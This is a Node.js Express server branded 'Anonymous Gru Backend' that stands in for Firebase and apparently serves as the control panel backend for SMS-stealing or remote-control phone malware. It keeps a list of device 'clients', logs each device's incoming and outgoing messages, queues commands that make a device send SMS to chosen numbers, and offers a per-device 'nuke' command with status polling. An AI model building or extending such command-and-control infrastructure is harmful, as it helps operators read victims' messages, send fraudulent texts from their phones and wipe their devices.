const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;

// ---------- Paths ----------
const DATA_DIR = path.join(__dirname, 'data');
const PUBLIC_DIR = path.join(__dirname, 'public');
const DEVICES_FILE = path.join(DATA_DIR, 'clients.json');     // "clients"
const MESSAGES_FILE = path.join(DATA_DIR, 'messages.json');
const OUTBOX_FILE = path.join(DATA_DIR, 'outbox.json');
const NUKE_JOBS_FILE = path.join(DATA_DIR, 'nukeJobs.json');   // for nuke status

// ---------- Ensure directories ----------
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(PUBLIC_DIR)) fs.mkdirSync(PUBLIC_DIR, { recursive: true });

// ---------- Init JSON files ----------
const initFile = (file, defaultData) => {
  if (!fs.existsSync(file)) {
    fs.writeFileSync(file, JSON.stringify(defaultData, null, 2));
  }
};
initFile(DEVICES_FILE, {});
initFile(MESSAGES_FILE, {});
initFile(OUTBOX_FILE, {});
initFile(NUKE_JOBS_FILE, {});

// ---------- Helpers ----------
const readJSON = (file) => {
  try { return JSON.parse(fs.readFileSync(file, 'utf8')); } catch { return {}; }
};
const writeJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

// ---------- Middleware ----------
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// ---------- Static files (CSS, JS, images, HTML) ----------
app.use(express.static(PUBLIC_DIR));

// ---------- Logging (debug ke liye) ----------
app.use((req, res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.url}`);
  next();
});

// ============================================
//   FIREBASE‑MOCK ENDPOINTS (EXACT MATCH)
// ============================================

// ---------- GET /clients.json ----------
app.get('/clients.json', (req, res) => {
  try {
    const clients = readJSON(DEVICES_FILE);
    res.json(clients);
  } catch (err) {
    res.status(500).json({ error: 'Failed to read clients' });
  }
});

// ---------- GET /clients/{id}.json ----------
app.get('/clients/:id.json', (req, res) => {
  try {
    const clients = readJSON(DEVICES_FILE);
    const device = clients[req.params.id];
    if (!device) return res.status(404).json({ error: 'Device not found' });
    res.json(device);
  } catch (err) {
    res.status(500).json({ error: 'Failed to read device' });
  }
});

// ---------- PUT /clients/{id}.json (update device) ----------
app.put('/clients/:id.json', (req, res) => {
  try {
    const id = req.params.id;
    const clients = readJSON(DEVICES_FILE);
    const existing = clients[id] || {};
    clients[id] = { ...existing, ...req.body, id, updatedAt: Date.now() };
    writeJSON(DEVICES_FILE, clients);
    res.json(clients[id]);
  } catch (err) {
    res.status(500).json({ error: 'Failed to update device' });
  }
});

// ---------- DELETE /clients/{id}.json ----------
app.delete('/clients/:id.json', (req, res) => {
  try {
    const id = req.params.id;
    const clients = readJSON(DEVICES_FILE);
    if (!clients[id]) return res.status(404).json({ error: 'Device not found' });
    delete clients[id];
    writeJSON(DEVICES_FILE, clients);
    res.json({ success: true });
  } catch (err) {
    res.status(500).json({ error: 'Failed to delete device' });
  }
});

// ---------- PUT /clients/{id}/webhookEvent/sendSms.json ----------
// Also handles /sendSms/{id}/{timestamp}.json
app.put('/clients/:id/webhookEvent/sendSms.json', handleSendSms);
app.put('/sendSms/:id/:timestamp.json', handleSendSms);

function handleSendSms(req, res) {
  try {
    const deviceId = req.params.id;
    const smsData = req.body;

    // Extract fields (supports multiple structures)
    const to = smsData.to || smsData.phoneNumber || smsData.action?.phoneNumber || '';
    const message = smsData.message || smsData.messageText || smsData.action?.messageText || '';
    const simSlot = smsData.simSlot || smsData.action?.simSlot || '1';

    // Store in outbox
    let outbox = readJSON(OUTBOX_FILE);
    if (!outbox[deviceId]) outbox[deviceId] = [];
    const entry = {
      id: uuidv4(),
      to,
      message,
      simSlot,
      status: 'queued',
      timestamp: Date.now(),
      dateTime: new Date().toISOString()
    };
    outbox[deviceId].push(entry);
    writeJSON(OUTBOX_FILE, outbox);

    // Also store as a message in messages log
    const messages = readJSON(MESSAGES_FILE);
    if (!messages[deviceId]) messages[deviceId] = [];
    messages[deviceId].push({
      sender: '📤 Device',
      message: `To: ${entry.to}\n${entry.message}`,
      dateTime: entry.dateTime,
      timestamp: entry.timestamp,
      type: 'outgoing'
    });
    writeJSON(MESSAGES_FILE, messages);

    // Simulate delivery after 2-5 seconds
    setTimeout(() => {
      const updated = readJSON(OUTBOX_FILE);
      if (updated[deviceId]) {
        const found = updated[deviceId].find(e => e.id === entry.id);
        if (found) found.status = 'sent';
        writeJSON(OUTBOX_FILE, updated);
      }
    }, 2000 + Math.random() * 3000);

    res.json({ success: true, entry });
  } catch (err) {
    res.status(500).json({ error: 'Failed to send SMS: ' + err.message });
  }
}

// ---------- GET /messages/{deviceId}.json ----------
app.get('/messages/:deviceId.json', (req, res) => {
  try {
    const deviceId = req.params.deviceId;
    const messages = readJSON(MESSAGES_FILE);
    const deviceMessages = messages[deviceId] || [];
    const sorted = deviceMessages.sort((a, b) => (a.timestamp || 0) - (b.timestamp || 0));
    const latest = sorted.slice(-150);
    res.json(latest);
  } catch (err) {
    res.status(500).json({ error: 'Failed to read messages' });
  }
});

// ---------- POST /messages/{deviceId}.json (add a message) ----------
app.post('/messages/:deviceId.json', (req, res) => {
  try {
    const deviceId = req.params.deviceId;
    const { sender, message, dateTime, type } = req.body;
    if (!message) return res.status(400).json({ error: 'Message text required' });
    const messages = readJSON(MESSAGES_FILE);
    if (!messages[deviceId]) messages[deviceId] = [];
    const entry = {
      sender: sender || 'Unknown',
      message,
      dateTime: dateTime || new Date().toISOString(),
      timestamp: Date.now(),
      type: type || 'incoming'
    };
    messages[deviceId].push(entry);
    writeJSON(MESSAGES_FILE, messages);
    res.json({ success: true, entry });
  } catch (err) {
    res.status(500).json({ error: 'Failed to add message' });
  }
});

// ---------- /api/report-firebase (as you requested) ----------
app.post('/api/report-firebase', (req, res) => {
  console.log('[/api/report-firebase] Received:');
  console.log(JSON.stringify(req.body, null, 2));
  res.json({ status: 'logged' });
});

// ---------- NUKE endpoint (if frontend calls) ----------
app.put('/clients/:id/webhookEvent/nuke.json', (req, res) => {
  const deviceId = req.params.id;
  console.log(`[NUKE] Triggered for device ${deviceId}`);
  // Store nuke job
  const nukeJobs = readJSON(NUKE_JOBS_FILE);
  const jobId = uuidv4();
  nukeJobs[deviceId] = {
    jobId,
    status: 'pending',
    progress: 0,
    message: 'Nuke initiated...',
    requestedAt: Date.now()
  };
  writeJSON(NUKE_JOBS_FILE, nukeJobs);
  // Simulate progress
  setTimeout(() => {
    const jobs = readJSON(NUKE_JOBS_FILE);
    if (jobs[deviceId]) {
      jobs[deviceId].progress = 100;
      jobs[deviceId].status = 'completed';
      jobs[deviceId].message = '✅ Nuke completed';
      writeJSON(NUKE_JOBS_FILE, jobs);
    }
  }, 3000);
  res.json({ success: true, jobId });
});

// ---------- GET /api/nuke/status/:deviceId (if frontend polls) ----------
app.get('/api/nuke/status/:deviceId', (req, res) => {
  const nukeJobs = readJSON(NUKE_JOBS_FILE);
  const job = nukeJobs[req.params.deviceId] || null;
  res.json(job);
});

// ---------- Health check ----------
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: Date.now() });
});

// ---------- Fallback for SPA (index.html) ----------
app.get('*', (req, res) => {
  // If it's an API call we didn't catch, return 404
  if (req.path.startsWith('/') && req.path.includes('.json')) {
    return res.status(404).json({ error: 'Endpoint not found' });
  }
  res.sendFile(path.join(PUBLIC_DIR, 'index.html'));
});

// ---------- Start server ----------
app.listen(PORT, () => {
  console.log(`\n🚀 Anonymous Gru Backend running on http://localhost:${PORT}`);
  console.log(`📡 Use this URL as "Firebase URL" and any dummy key.\n`);
  console.log(`📂 Data stored in "${DATA_DIR}" folder.`);
  console.log(`📁 Static files served from "${PUBLIC_DIR}".\n`);
});
